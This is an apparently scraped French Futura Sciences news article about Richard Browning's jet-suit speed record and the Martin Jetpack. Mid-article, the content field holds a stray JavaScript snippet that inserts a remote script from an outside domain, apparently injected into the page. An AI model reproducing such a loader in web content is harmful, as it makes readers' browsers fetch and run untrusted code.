{"title": "Iron Man : il bat le record du monde de vitesse en jetpack", "newspaper": "Futura Sciences", "author": "Marc Zaffagni", "date_publi": "10/11/2017", "content": "Le Britannique Richard Browning vient de s'adjuger un record du monde de vitesse avec sa combinaison inspirée du super-héros Iron Man. Équipé de réacteurs au niveau des bras et du dos, il a volé à quelques mètres au-dessus d'un lac à plus de 51 km/h. Richard Browning est, à ce jour, l'incarnation la plus crédible d' Iron Man . Ce Britannique, ancien militaire de carrière et grand sportif, vient de battre le record du monde de «  vitesse la plus élevée dans une combinaison propulsée par réacteurs et contrôlée par le corps  », selon la dénomination créée spécialement par le  Livre Guinness des records  qui a homologué la performance. L'exploit, dont on peut voir un résumé dans la vidéo ci-dessous, s'est déroulé au-dessus d'un lac à  Lagoona Park , dans la ville de Reading (Royaume-Uni). Le pilote devait  voler  sur une distance minimale de 100 mètres et dépasser les 48 km/h. Il y est parvenu au bout de la troisième tentative en atteignant 51,5 km/h, avant de finir sa course dans l'eau.  Voici la vidéo de la tentative de record de vitesse accomplie par Richard Browning à l’aide de sa combinaison à réacteurs. Le troisième essai fut le bon, mais le pilote a ensuite effectué un plongeon dans l’eau sans que l’on sache si c’était volontaire ou causé par l’épuisement. ©  Guinness World Records  Une combinaison qui pèse 45 kg Le costume d'Iron Man de Richard Browning se compose de mini-réacteurs utilisés pour l' aéromodélisme  placés au niveau des bras et dans le  dos . Ces turbines, que l'on peut acheter dans le commerce, sont capables de délivrer jusqu'à 40 kg de poussée. Les six réacteurs de Richard Browning peuvent soulever 130 kg. C'est le pilote qui contrôle les gaz à l'aide de manettes. La combinaison pèse 45 kg.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Le plus impressionnant est qu'il n'y a aucun système de stabilisation automatique : tout est contrôlé avec la force du corps. Maîtriser une telle puissance demande une condition physique exceptionnelle et un apprentissage pour le moins empirique. Pour preuve, une  autre vidéo , publiée par Red Bull, montre l'entraînement intensif que Richard Browning s'impose et les mésaventures qu'il a rencontrées. Ce n'est pas donné à tout le monde de se prendre pour Iron Man ! Pour en savoir plus Jetpack, ou comment voler avec des hélices dans le dos ! Article initial paru le 9/06/2011 Certains hommes rêvent de voler et ils prennent l'avion. D'autres ont gardé leur esprit d'enfant et inventent des machines dignes de la science-fiction. C'est ce qu'a fait le Néo-Zélandais Glenn Martin, avec le Martin Jetpack, cet engin ressemblant à un sac à dos (de 115 kilos !) pour s'élever à plus de 1.500 mètres du sol. Plus fort encore : la commercialisation est annoncée dans un an et demi. C'est après trente ans de recherches et une série d'échecs que Glenn Martin voit enfin le bout du tunnel. En effet, essai réussi pour son réacteur  dorsal  qui a volé avec un mannequin à bord ! Si le décollage a été vertical, l'atterrissage, quant à lui, s'est effectué grâce au  parachute  normalement utilisé en cas d'urgence. Si l'on peut saluer la belle performance, Glenn Martin n'est pas le premier à avoir réalisé ce type d'exploit. Plusieurs appareils de ce genre ont déjà volé, mais avec des réacteurs, comme le  Bell Rocket Belt . Rappelons aussi que  Fusion Man  (ou Jet Man) a traversé la Manche le 26 septembre 2008 équipé d'une aile sur les épaules et de quatre petits réacteurs. Glenn Martin explique en anglais au début de cette vidéo que ce projet est du jamais-vu. © Martin JetPack, YouTube Un atterrissage les pieds sur terre La différence avec l'invention de  Jet Man  (alias Yves Rossy) est qu'il n'a pas d'ailes ! L'engin vole comme un  hélicoptère . Il peut donc décoller et atterrir verticalement. De quoi partir de son jardin pour aller se poser chez des amis, à côté du barbecue. En théorie du moins. Aucun essai, en effet, n'a pour l'instant pu prouver qu'il était possible pour un Homme d'arriver sur ses deux pieds sans tomber avec 115 kilos dans le dos ! L'appareil est pourtant en  fibre de carbone . Un moteur de 4 cylindres, spécialement conçu et développant 200 chevaux, entraîne deux grosses hélices entourées de  carénages . L'appareil repose verticalement sur son train d'atterrissage (rétractable) et le pilote s'accroche sur lui, restant en position debout. En cas de panne moteur, un  parachute  s'ouvre et ramène le tout sur la  terre  ferme. D'après son concepteur, le Martin Jetpack peut voler 30 minutes et parcourir 50 kilomètres. La maîtrise de l'appareil, aux dires du créateur, ne demande pas plus d'une heure d'entraînement.  Une portée prometteuse  Glenn Martin est très optimiste sur la portée de l'appareil : «  Les premières personnes qui l'utiliseront seront les personnels médicaux pour les interventions d'urgence. On pourra ensuite l'équiper de caméras, pour des informations sur le trafic routier, puis l'employer pour aller au travail, ou pour s'amuser  ». Il reste toutefois des problèmes législatifs à régler : un engin léger obtiendra-t-il le droit de  voler  au-dessus d'habitations ? Il vous faudra tout de même attendre 2012, la fin des essais et débourser la coquette somme de 69.000 euros pour vous acheter ce petit bijou. Les plus économes pourront se tourner vers le paramoteur, plus paisible, et pour l'heure le seul  engin volant  qui rentre dans un coffre de  voiture . Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  actu aviation  |  invention ancienne  |  date invention du feu  |  invention scooter  |  invention du patin glace  |  fusion du reacteur  |  reacteur avion  |  temps invention de homme  |  fonctionnement reacteur avion  |  mini reacteur avion", "theme": "tech"}